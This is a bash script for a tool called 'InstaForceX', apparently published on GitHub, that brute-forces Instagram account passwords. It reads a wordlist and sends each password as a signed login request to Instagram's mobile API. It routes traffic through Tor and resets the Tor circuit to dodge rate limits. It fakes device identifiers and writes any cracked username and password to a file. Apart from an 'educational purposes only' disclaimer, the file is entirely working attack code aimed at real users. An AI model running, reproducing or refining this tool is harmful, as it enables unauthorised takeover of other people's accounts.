#!/bin/bash
# InstaForceX - Instagram Brute Force Tool
# Version: 1.0
# License: MIT
# Author: nayandas69
# GitHub: https://github.com/nayandas69
# Dependencies: openssl, curl, tor, awk, sed, cut, tr, uniq, cat, wc
# Description: A simple Instagram brute force tool using Tor and curl.
# Note: This script requires Tor to be running. Start it using 'tor' or 'service tor start'.
# Disclaimer: This tool is for educational purposes only. Use it responsibly and at your own risk.

# Trap Ctrl+C and store session
trap 'save_session; exit 1' INT

# === BANNER ===
show_banner() {
    clear
    echo -e "\e[1;95m"
    echo "
 _____ ______     _    _______           _______ _____  ______   ______ _______    _    _ 
(_____)  ___ \   | |  (_______)  /\     (_______) ___ \(_____ \ / _____|_______)  \ \  / /
   _  | |   | |   \ \  _        /  \     _____ | |   | |_____) ) /      _____      \ \/ / 
  | | | |   | |    \ \| |      / /\ \   |  ___)| |   | (_____ (| |     |  ___)      )  (  
 _| |_| |   | |_____) ) |_____| |__| |  | |    | |___| |     | | \_____| |_____    / /\ \ 
(_____)_|   |_(______/ \______)______|  |_|     \_____/      |_|\______)_______)  /_/  \_\
                                                                                          
"
    echo "          INSTA FORCE X v1.0"
    echo "          Coded by: nayandas69"
    echo "          Repo:  https://github.com/nayandas69/instaforcex"
    echo -e "\e[0m"
}

# === CHECK ROOT ===
check_root() {
    [[ "$(id -u)" -ne 0 ]] && echo -e "\e[1;91mRun as root!\e[0m" && exit 1
}

# === CHECK DEPENDENCIES ===
check_deps() {
    local deps=("openssl" "curl" "tor" "awk" "sed" "cut" "tr" "uniq" "cat" "wc")
    for dep in "${deps[@]}"; do
        command -v "$dep" &> /dev/null || {
            echo -e "\e[1;91mMissing dependency: $dep\e[0m"
            exit 1
        }
    done
}

# === CHECK TOR ===
check_tor() {
    curl --socks5 127.0.0.1:9050 -s https://check.torproject.org | grep -q "Congratulations" || {
        echo -e "\e[1;91mTOR is not working. Start it using 'tor' or 'service tor start'\e[0m"
        exit 1
    }
}

# === GLOBAL VARIABLES ===
session_dir="sessions"
found_file="found/instaforcex.found"
mkdir -p "$session_dir" found wordlists

# === SAVE SESSION ===
save_session() {
    [[ -n "$threads" ]] && sleep 2
    echo -ne "\n\e[1;94mDo you want to save session for $username? [Y/n]: \e[0m"
    read -r answer
    answer="${answer:-Y}"
    if [[ "$answer" =~ ^[Yy]$ ]]; then
        session_file="$session_dir/session.$username.$(date +%s)"
        echo "username=\"$username\"" > "$session_file"
        echo "last_pass=\"$last_pass\"" >> "$session_file"
        echo "wordlist=\"$wordlist\"" >> "$session_file"
        echo "threads=\"$threads\"" >> "$session_file"
        echo -e "\e[1;92mSession saved to $session_file\e[0m"
    fi
}

# === CHANGE TOR IP ===
change_ip() {
    killall -HUP tor &>/dev/null
    sleep 3
}

# === BRUTE FORCE ===
brute_force() {
    total_pass=$(wc -l < "$wordlist")
    echo -e "\e[1;93mBrute Forcing $username using $wordlist ($total_pass passwords)\e[0m"
    echo -e "\e[1;90mPress Ctrl+C at any time to stop the attack and save your session progress.\e[0m"
    echo -e "\e[1;92mStarting brute force...\e[0m"

    start=1
    end=$threads

    while true; do
        for password in $(sed -n "${start},${end}p" "$wordlist"); do
            last_pass="$password"
            device_id="android-$(openssl rand -hex 8)"
            guid="$(openssl rand -hex 4)-$(openssl rand -hex 2)-$(openssl rand -hex 2)-$(openssl rand -hex 2)-$(openssl rand -hex 6)"
            csrftoken="$(openssl rand -hex 8)"
            user_agent="Instagram 10.26.0 Android"

            post_data="{\"phone_id\":\"$guid\",\"_csrftoken\":\"$csrftoken\",\"username\":\"$username\",\"guid\":\"$guid\",\"device_id\":\"$device_id\",\"password\":\"$password\",\"login_attempt_count\":\"0\"}"
            sig_key="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
            hmac=$(echo -n "$post_data" | openssl dgst -sha256 -hmac "$sig_key" | cut -d" " -f2)

            echo -ne "\e[1;97mTrying: $password ... \e[0m"

            result=$(curl --socks5 127.0.0.1:9050 -s \
                -H "User-Agent: $user_agent" \
                -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
                -d "ig_sig_key_version=4&signed_body=$hmac.$post_data" \
                https://i.instagram.com/api/v1/accounts/login/)

            if [[ "$result" =~ "challenge" ]]; then
                echo -e "\e[1;92mFOUND (Challenge Required): $password\e[0m"
                echo "Username: $username | Password: $password" >> "$found_file"
                exit
            elif [[ "$result" =~ "logged_in_user" ]]; then
                echo -e "\e[1;92mSUCCESS: $password\e[0m"
                echo "Username: $username | Password: $password" >> "$found_file"
                exit
            elif [[ "$result" =~ "Please wait" ]]; then
                echo -e "\e[1;93mRATE LIMIT - Changing IP\e[0m"
                change_ip
            else
                echo -e "\e[1;91mFailed\e[0m"
            fi
        done
        start=$((start + threads))
        end=$((end + threads))
        change_ip
    done
}

# === RESUME SESSION ===
resume_session() {
    show_banner
    check_tor
    echo -e "\e[1;92mAvailable Sessions:\e[0m"
    select session_file in "$session_dir"/session.*; do
        source "$session_file"
        break
    done
    echo -e "\e[1;94mResuming session for $username\e[0m"
    brute_force
}

# === MAIN START ===
main() {
    show_banner
    check_root
    check_deps

    if [[ "$1" == "--resume" ]]; then
        resume_session
    fi

    read -p $'\e[1;92mEnter Instagram username: \e[0m' username
    valid=$(curl -s "https://www.instagram.com/$username/?__a=1" | grep -c "user")
    [[ "$valid" -eq 0 ]] && echo -e "\e[1;91mInvalid username\e[0m" && exit 1

    read -p $'\e[1;92mEnter path to wordlist (or press Enter for wordlists/passwords.lst): \e[0m' wordlist
    wordlist="${wordlist:-wordlists/passwords.lst}"
    [[ ! -f "$wordlist" ]] && echo -e "\e[1;91mWordlist not found\e[0m" && exit 1

    read -p $'\e[1;92mThreads (default 10, max 20): \e[0m' threads
    threads="${threads:-10}"
    [[ "$threads" -gt 20 ]] && echo -e "\e[1;91mToo many threads. Max is 20.\e[0m" && exit 1

    check_tor
    brute_force
}

main "$@"
